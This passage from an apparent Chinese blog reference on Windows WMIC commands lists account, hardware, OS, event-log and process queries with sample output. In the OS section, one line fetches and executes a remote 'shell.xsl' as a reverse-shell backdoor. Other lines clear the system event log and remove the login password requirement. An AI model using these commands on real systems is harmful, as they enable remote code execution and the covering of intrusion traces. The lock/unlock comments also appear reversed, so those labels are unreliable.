<h3 id="useraccount-用户帐户管理计算机用户列表"><a href="#useraccount-用户帐户管理计算机用户列表" class="headerlink" title="useraccount - 用户帐户管理计算机用户列表"></a>useraccount - 用户帐户管理计算机用户列表</h3><p><strong>基础语法：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">USERACCOUNT ASSOC [&lt;格式说明符&gt;]</span><br><span class="line">USERACCOUNT CALL &lt;方法名称&gt; [&lt;实际参数列表&gt;]</span><br><span class="line">USERACCOUNT CREATE &lt;分配列表&gt;</span><br><span class="line">USERACCOUNT DELETE</span><br><span class="line">USERACCOUNT GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">USERACCOUNT LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br><span class="line">USERACCOUNT SET [&lt;分配列表&gt;] <span class="comment">#设置是否禁用/名称/锁定/密码是否能更改以及密码失效的时间</span></span><br><span class="line">    Disabled            boolean</span><br><span class="line">    FullName            string </span><br><span class="line">    Lockout             boolean </span><br><span class="line">    PasswordChangeable  boolean</span><br><span class="line">    PasswordExpires     boolean</span><br><span class="line">    PasswordRequired    boolean <span class="comment">#密码需要</span></span><br></pre></td></tr></table></figure></p>
<p><strong>基础示例:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0.用户信息获取</span></span><br><span class="line">wmic useraccount list brief</span><br><span class="line">  <span class="comment"># AccountType  Caption                       Domain     FullName           Name                SID</span></span><br><span class="line">  <span class="comment"># 512          WEIYIGEEK\Administrator       WEIYIGEEK                     Administrator       S-1-5-21-923396991-3399624210-3190802951-500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.当前计算机用户和所有计算机匹配到的用户列表</span></span><br><span class="line">WMIC USERACCOUNT <span class="built_in">where</span> <span class="string">"name='%UserName%'"</span> </span><br><span class="line">WMIC USERACCOUNT LIST /FORMAT:VALUE | findstr /n <span class="string">"\&lt;Name\&gt; \&lt;SID\&gt; Descrip Password"</span></span><br><span class="line"><span class="comment"># AccountType  Caption                       Domain     FullName  Name                SID</span></span><br><span class="line"><span class="comment"># 512          WEIYIGEEK\Administrator       WEIYIGEEK            Administrator       S-1-5-21-923396991-3399624210-3190802951-500</span></span><br><span class="line"><span class="comment"># - 更改用户名Administrator为WeiyiGeek</span></span><br><span class="line">wmic useraccount <span class="built_in">where</span> <span class="string">"name='Administrator"</span> call Rename WeiyiGeek          </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.相关信息更改</span></span><br><span class="line"><span class="comment"># - 计算机用户名称更改</span></span><br><span class="line">wmic USERACCOUNT <span class="built_in">where</span> name=<span class="string">"Administrator"</span> <span class="built_in">set</span> FullName=<span class="string">"admin"</span>  <span class="comment">#更改用户administrator全名为admin</span></span><br><span class="line"><span class="comment"># - Lock user account</span></span><br><span class="line">wmic useraccount <span class="built_in">where</span> name=<span class="string">'username'</span> <span class="built_in">set</span> disabled=<span class="literal">false</span></span><br><span class="line"><span class="comment"># - Unlock user account</span></span><br><span class="line">wmic useraccount <span class="built_in">where</span> name=<span class="string">'username'</span> <span class="built_in">set</span> disabled=<span class="literal">true</span></span><br><span class="line"><span class="comment"># - Remove password requirement for logging in</span></span><br><span class="line">wmic useraccount <span class="built_in">where</span> name=<span class="string">'username'</span> <span class="built_in">set</span> PasswordRequired=<span class="literal">false</span></span><br><span class="line"><span class="comment"># - Restrict user from changing password - 限制用户更改密码</span></span><br><span class="line">wmic useraccount <span class="built_in">where</span> name=<span class="string">'username'</span> <span class="built_in">set</span> passwordchangeable=<span class="literal">false</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="group-组帐户管理"><a href="#group-组帐户管理" class="headerlink" title="group - 组帐户管理"></a>group - 组帐户管理</h3><p><strong>基础语法</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用法</span></span><br><span class="line">GROUP ASSOC [&lt;格式说明符&gt;]</span><br><span class="line">GROUP CALL &lt;方法名称&gt; [&lt;实际参数列表&gt;]</span><br><span class="line">GROUP CREATE &lt;分配列表&gt;</span><br><span class="line">GROUP DELETE</span><br><span class="line">GROUP GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">GROUP LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示: BNF 的别名用法。</span></span><br><span class="line">(&lt;别名&gt; [WMI 对象] | &lt;别名&gt; [&lt;路径 <span class="built_in">where</span>&gt;] | [&lt;别名&gt;] &lt;路径 <span class="built_in">where</span>&gt;) [&lt;谓词子句&gt;]。</span><br></pre></td></tr></table></figure></p>
<p><strong>简单示例:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># - 获取组SID</span></span><br><span class="line">wmic group get Caption,InstallDate,LocalAccount,Domain,SID,Status </span><br><span class="line"><span class="comment"># aption                                        Domain     InstallDate  LocalAccount  SID                                            Status</span></span><br><span class="line"><span class="comment"># WEIYIGEEK\Access Control Assistance Operators  WEIYIGEEK               TRUE          S-1-5-32-579                                   OK</span></span><br><span class="line"><span class="comment"># WEIYIGEEK\Administrators                       WEIYIGEEK               TRUE          S-1-5-32-544                                   OK</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="cpu"><a href="#cpu" class="headerlink" title="cpu"></a>cpu</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># //查看CPU及其内存状况内存速率</span></span><br><span class="line">wmic cpu get SystemName,Caption,name,CurrentClockSpeed  </span><br><span class="line"><span class="comment"># Caption                               CurrentClockSpeed  Name                                     SystemName</span></span><br><span class="line"><span class="comment"># Intel64 Family 6 Model 60 Stepping 3  3301               Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz  WEIYIGEEK</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#//查看系统实际核心数(启用)以及线程数</span></span><br><span class="line">&gt; wmic cpu get NumberOfCores,NumberOfEnabledCore,NumberOfLogicalProcessors</span><br><span class="line">NumberOfCores  NumberOfEnabledCore  NumberOfLogicalProcessors</span><br><span class="line">8              8                    8</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="os-系统信息"><a href="#os-系统信息" class="headerlink" title="os - 系统信息"></a>os - 系统信息</h3><p>基础语法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OS CALL &lt;方法名称&gt; [&lt;实际参数列表&gt;]</span><br><span class="line">OS CREATE &lt;分配列表&gt;</span><br><span class="line">OS DELETE</span><br><span class="line">OS GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">OS LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br><span class="line">OS SET [&lt;分配列表&gt;]</span><br><span class="line"></span><br><span class="line">&gt; wmic os get /?  <span class="comment">#可能会被恶意了利用metasploit生成xsl马儿</span></span><br><span class="line">/FORMAT:&lt;格式说明符&gt;   - 处理 XML 结果的关键字/XSL 文件名。</span><br></pre></td></tr></table></figure></p>
<p>简单示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0.获取操作系统详情</span></span><br><span class="line">wmic os get /all /format:list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.计算机简要信息</span></span><br><span class="line">wmic os list brief</span><br><span class="line">  <span class="comment"># BuildNumber  Organization  RegisteredUser  SerialNumber             SystemDirectory      Version</span></span><br><span class="line">  <span class="comment"># 18362                      WeiyiGeek       00331-10000-00001-AA685  C:\Windows\system32  10.0.18362</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 获取指定键的值</span></span><br><span class="line">Wmic os get ServicePackMajorVersion <span class="comment"># XP或者Win7 可用查看SP版本</span></span><br><span class="line">Wmic os get ProductType,OperatingSystemSKU</span><br><span class="line">  <span class="comment"># OperatingSystemSKU  ProductType</span></span><br><span class="line">  <span class="comment"># 48                  1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.实现反弹后门</span></span><br><span class="line">wmic os get /FORMAT:<span class="string">"http://lyshark.com/shell.xsl"</span> &amp; timeout /T 1 /NOBREAK &amp; wmic os get /FORMAT:<span class="string">"http://lyshark.com/shell.xsl"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.设置覆盖安装实际</span></span><br><span class="line">wmic os <span class="built_in">where</span>(primary=1) call setdatetime 20070731144642.555555+480</span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115205334.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115205334.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
<h3 id="bios"><a href="#bios" class="headerlink" title="bios"></a>bios</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看bios版本型号</span></span><br><span class="line">wmic bios get BIOSVersion,Manufacturer,Name</span><br><span class="line"><span class="comment"># BIOSVersion                                                 Manufacturer  Name</span></span><br><span class="line"><span class="comment"># &#123;"DELL   - 1072009", "A11", "American Megatrends - 4028D"&#125;  Dell Inc.     A11</span></span><br></pre></td></tr></table></figure><br><br></p>
<h3 id="csproduct"><a href="#csproduct" class="headerlink" title="csproduct"></a>csproduct</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#//计算机系统产品信息(笔记本型号)</span></span><br><span class="line">WMIC CSPRODUCT LIST FULL       </span><br><span class="line"><span class="comment"># Description=计算机系统产品</span></span><br><span class="line"><span class="comment"># IdentifyingNumber=8QVY</span></span><br><span class="line"><span class="comment"># Name=OptiPlex </span></span><br><span class="line"><span class="comment"># SKUNumber=</span></span><br><span class="line"><span class="comment"># UUID=4C4C4544-5551-5610-8059-B8C04F383632</span></span><br><span class="line"><span class="comment"># Vendor=Dell Inc.</span></span><br><span class="line"><span class="comment"># Version=00</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="computersystem"><a href="#computersystem" class="headerlink" title="computersystem"></a>computersystem</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.系统信息</span></span><br><span class="line">WMIC COMPUTERSYSTEM list /format:list | findstr /n <span class="string">"\&lt;Domain\&gt; Roles UserName Manufacturer Model  "</span></span><br><span class="line"><span class="comment"># 16:Domain=WORKGROUP</span></span><br><span class="line"><span class="comment"># 25:Manufacturer=Dell Inc.</span></span><br><span class="line"><span class="comment"># 26:Model=OptiPlex 9020</span></span><br><span class="line"><span class="comment"># 44:Roles=&#123;"LM_Workstation","LM_Server","Print","NT"&#125;</span></span><br><span class="line"><span class="comment"># 53:UserName=WEIYIGEEK\WeiyiGeek</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.退出所在域</span></span><br><span class="line">wmic computersystem Where <span class="string">"name='计算机名称'"</span> call joindomainorworkgroup <span class="string">""</span>,1,<span class="string">"域名称"</span>,<span class="string">"域管理员密码"</span>,<span class="string">"域管理员用户名"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.更改现有工作组为指定的工作组</span></span><br><span class="line">wmic computersystem Where <span class="string">"name='计算机名称'"</span> call UnjoinDomainOrWorkgroup</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.更改计算机名称</span></span><br><span class="line">wmic computersystem <span class="built_in">where</span> <span class="string">"caption='%ComputerName%'"</span> call rename newcomputername</span><br><span class="line"></span><br><span class="line"><span class="comment"># - 补充信息: 获取系统角色、用户名和制造商</span></span><br><span class="line">wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list</span><br><span class="line">  <span class="comment"># Domain=WORKGROUP</span></span><br><span class="line">  <span class="comment"># Manufacturer=Dell Inc.</span></span><br><span class="line">  <span class="comment"># Model=OptiPlex 9020</span></span><br><span class="line">  <span class="comment"># Name=WEIYIGEEK</span></span><br><span class="line">  <span class="comment"># Roles=&#123;"LM_Workstation","LM_Server","Print","NT"&#125;</span></span><br><span class="line">  <span class="comment"># UserName=WEIYIGEEK\WeiyiGeek</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="baseboard"><a href="#baseboard" class="headerlink" title="baseboard"></a>baseboard</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  //主板信息</span></span><br><span class="line">WMIC BASEBOARD LIST /FORMAT:list | findstr  <span class="string">"\&lt;Description\&gt; Product Manufacturer"</span> </span><br><span class="line">Description=基板</span><br><span class="line">Manufacturer=Dell Inc.</span><br><span class="line">Product=03CPWF</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="memlogical"><a href="#memlogical" class="headerlink" title="memlogical"></a>memlogical</h3><p>描述:Windows10中不能执行该命令;<br>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取内存数:</span></span><br><span class="line">wmic memlogical get totalphysicalmemory</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="sounddev"><a href="#sounddev" class="headerlink" title="sounddev"></a>sounddev</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#声音设备管理信息</span></span><br><span class="line">ProductName                       Status  StatusInfo</span><br><span class="line">Realtek High Definition Audio     OK      3</span><br><span class="line">AMD High Definition Audio Device  OK      3</span><br></pre></td></tr></table></figure><br><br></p>
<h3 id="diskdrive"><a href="#diskdrive" class="headerlink" title="diskdrive"></a>diskdrive</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取物理磁盘型号大小等  500105249280  (gb|mb|kb|b)</span></span><br><span class="line">wmic DISKDRIVE get Caption,size,InterfaceType                       </span><br><span class="line"><span class="comment"># Caption                      InterfaceType  Size</span></span><br><span class="line"><span class="comment"># ST1000DM010-2EP102           SCSI           1000202273280</span></span><br><span class="line"><span class="comment"># WD Elements 1078 USB Device  USB            1000169372160</span></span><br></pre></td></tr></table></figure><br><br></p>
<h3 id="logicaldisk"><a href="#logicaldisk" class="headerlink" title="logicaldisk"></a>logicaldisk</h3><p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本地储存设备管理 - 获取硬盘系统格式、总大小、可用空间等 （能看见全部磁盘）</span></span><br><span class="line">wmic LOGICALDISK get name,Description,filesystem,size,freespace      </span><br><span class="line"><span class="comment"># Description   FileSystem  FreeSpace     Name  Size</span></span><br><span class="line"><span class="comment"># 本地固定磁盘  NTFS        94062698496   C:    161062318080</span></span><br><span class="line"><span class="comment"># 本地固定磁盘  NTFS        260568281088  D:    280247660544</span></span><br><span class="line"><span class="comment"># 本地固定磁盘  NTFS        244968955904  E:    279173918720</span></span><br><span class="line"><span class="comment"># 本地固定磁盘  NTFS        184098725888  F:    279480832000</span></span><br><span class="line"><span class="comment"># 光盘                                    G:</span></span><br><span class="line"><span class="comment"># 光盘                                    I:</span></span><br><span class="line"><span class="comment"># 本地固定磁盘  NTFS        275694428160  L:    536870907904</span></span><br><span class="line"><span class="comment"># 本地固定磁盘  NTFS        282572599296  M:    463298621440</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="desktopmonitor"><a href="#desktopmonitor" class="headerlink" title="desktopmonitor"></a>desktopmonitor</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># //显示系统屏幕大小 -- 注意条件</span></span><br><span class="line">wmic DESKTOPMONITOR <span class="built_in">where</span> Status=<span class="string">'ok'</span> get ScreenHeight,ScreenWidth  </span><br><span class="line"><span class="comment"># ScreenHeight  ScreenWidth</span></span><br><span class="line"><span class="comment"># 1080          1920</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="ONBOARDDEVICE-主板-系统板-中内置的通用适配器设备的管理"><a href="#ONBOARDDEVICE-主板-系统板-中内置的通用适配器设备的管理" class="headerlink" title="ONBOARDDEVICE - 主板(系统板)中内置的通用适配器设备的管理"></a>ONBOARDDEVICE - 主板(系统板)中内置的通用适配器设备的管理</h3><p>基础语法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用法:</span></span><br><span class="line">ONBOARDDEVICE ASSOC [&lt;格式说明符&gt;]</span><br><span class="line">ONBOARDDEVICE CREATE &lt;分配列表&gt;</span><br><span class="line">ONBOARDDEVICE DELETE</span><br><span class="line">ONBOARDDEVICE GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">ONBOARDDEVICE LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br></pre></td></tr></table></figure></p>
<p>简单示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># - 判断目标系统是否为虚拟机</span></span><br><span class="line">wmic onboarddevice get Desciption,DeviceType,Enabled,Status /format:list</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="NTEVENTLOG-NT-事件日志文件管理"><a href="#NTEVENTLOG-NT-事件日志文件管理" class="headerlink" title="NTEVENTLOG - NT 事件日志文件管理"></a>NTEVENTLOG - NT 事件日志文件管理</h3><p>基础语法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTEVENTLOG ASSOC [&lt;格式说明符&gt;]</span><br><span class="line">NTEVENTLOG CALL &lt;方法名称&gt; [&lt;实际参数列表&gt;]</span><br><span class="line">NTEVENTLOG CREATE &lt;分配列表&gt;</span><br><span class="line">NTEVENTLOG DELETE</span><br><span class="line">NTEVENTLOG GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">NTEVENTLOG LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br><span class="line">NTEVENTLOG SET [&lt;分配列表&gt;]</span><br></pre></td></tr></table></figure></p>
<p>基础操作:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># - (1) 查看系统各类日志记录条数及其分类</span></span><br><span class="line">wmic nteventlog list brief</span><br><span class="line">  <span class="comment"># FileSize  LogfileName             Name                                                         NumberOfRecords</span></span><br><span class="line">  <span class="comment"># 9506816   Application             C:\WINDOWS\System32\Winevt\Logs\Application.evtx             13542</span></span><br><span class="line">  <span class="comment"># 69632     HardwareEvents          C:\WINDOWS\System32\Winevt\Logs\HardwareEvents.evtx          0</span></span><br><span class="line">  <span class="comment"># 69632     Internet Explorer       C:\WINDOWS\System32\Winevt\Logs\Internet Explorer.evtx       0</span></span><br><span class="line">  <span class="comment"># 69632     Key Management Service  C:\WINDOWS\System32\Winevt\Logs\Key Management Service.evtx  0</span></span><br><span class="line">  <span class="comment"># 69632     OAlerts                 C:\WINDOWS\System32\Winevt\Logs\OAlerts.evtx                 66</span></span><br><span class="line">  <span class="comment"># 69632     Parameters              C:\WINDOWS\System32\Winevt\Logs\Parameters.evtx              0</span></span><br><span class="line">  <span class="comment"># 69632     State                   C:\WINDOWS\System32\Winevt\Logs\State.evtx                   0</span></span><br><span class="line">  <span class="comment"># 19992576  System                  C:\WINDOWS\System32\Winevt\Logs\System.evtx                  49428</span></span><br><span class="line">  <span class="comment"># 15732736  Windows PowerShell      C:\WINDOWS\System32\Winevt\Logs\Windows PowerShell.evtx      9880</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - (2) 清理系统日志</span></span><br><span class="line">wmic nteventlog <span class="built_in">where</span> logfileName=<span class="string">'system'</span> call cleareventlog</span><br><span class="line">  <span class="comment"># 执行 (\\WEIYIGEEK\ROOT\CIMV2:Win32_NTEventlogFile.Name="C:\\WINDOWS\\System32\\Winevt\\Logs\\System.evtx")-&gt;cleareventlog() 方法执行成功</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="0x02-系统服务进程"><a href="#0x02-系统服务进程" class="headerlink" title="0x02 系统服务进程"></a>0x02 系统服务进程</h2><h3 id="process-进程查看和修改"><a href="#process-进程查看和修改" class="headerlink" title="process - 进程查看和修改"></a>process - 进程查看和修改</h3><p>基础语法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PROCESS ASSOC [&lt;format specifier&gt;]  <span class="comment">#关联进程</span></span><br><span class="line">PROCESS CALL &lt;method name&gt; [&lt;actual param list&gt;]  <span class="comment">#调用函数</span></span><br><span class="line">  * terminate <span class="comment">#关闭进程</span></span><br><span class="line">  * create    <span class="comment">#创建进程</span></span><br><span class="line">  * AttachDebugger <span class="comment">#调试进程</span></span><br><span class="line">  * GetOwner  <span class="comment">#获取执行者</span></span><br><span class="line">  * GetOwnerSid <span class="comment">#获取执行则者SID</span></span><br><span class="line">  * SetPriority <span class="comment">#设置进程优先级</span></span><br><span class="line"></span><br><span class="line">PROCESS CREATE &lt;assign list&gt;  <span class="comment">#创建进程</span></span><br><span class="line">PROCESS DELETE   <span class="comment">#删除进行</span></span><br><span class="line">PROCESS GET [&lt;property list&gt;] [&lt;get switches&gt;] <span class="comment">#获取进程信息</span></span><br><span class="line">PROCESS LIST [&lt;list format&gt;] [&lt;list switches&gt;]  <span class="comment">#列举进程</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>基础实例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.显示进程的详细信息</span></span><br><span class="line">PS C:\Windows\System32\wbem&gt; wmic process list brief</span><br><span class="line">PS C:\Windows\System32\wbem&gt; wmic process list full</span><br><span class="line"><span class="comment"># HandleCount  Name                         Priority  ProcessId  ThreadCount  WorkingSetSize</span></span><br><span class="line"><span class="comment"># 0            System Idle Process          0         0          4            8192</span></span><br><span class="line"><span class="comment"># 7653         System                       8         4          188          32768</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.获取指定进程信息(非常实用)</span></span><br><span class="line"><span class="comment"># - 查看独立ＰＩＤ进程名以及及=可执行路径常常和/FORMAT:VALUE联用</span></span><br><span class="line">wmic process get name,commandline,processid,executablepath /FORMAT:List         </span><br><span class="line"><span class="comment"># CommandLine="C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_0.6.2951.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"</span></span><br><span class="line"><span class="comment"># ExecutablePath=C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_0.6.2951.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe</span></span><br><span class="line"><span class="comment"># 